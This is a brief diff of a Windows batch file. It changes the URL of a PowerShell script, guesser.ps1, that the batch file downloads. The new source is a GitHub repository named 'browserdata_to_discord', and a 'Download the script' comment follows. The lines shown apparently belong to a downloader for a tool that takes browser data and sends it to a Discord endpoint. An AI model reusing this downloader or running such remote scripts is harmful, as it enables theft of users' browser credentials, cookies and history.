@@ -1,5 +1,5 @@
 @echo off
-set SCRIPT_URL=https://raw.githubusercontent.com/HFScripts/hookguesser/main/guesser.ps1
+set SCRIPT_URL=https://github.com/pentestfunctions/browserdata_to_discord/blob/main/guesser.ps1
 set SCRIPT_NAME=guesser.ps1
 
 REM Download the script
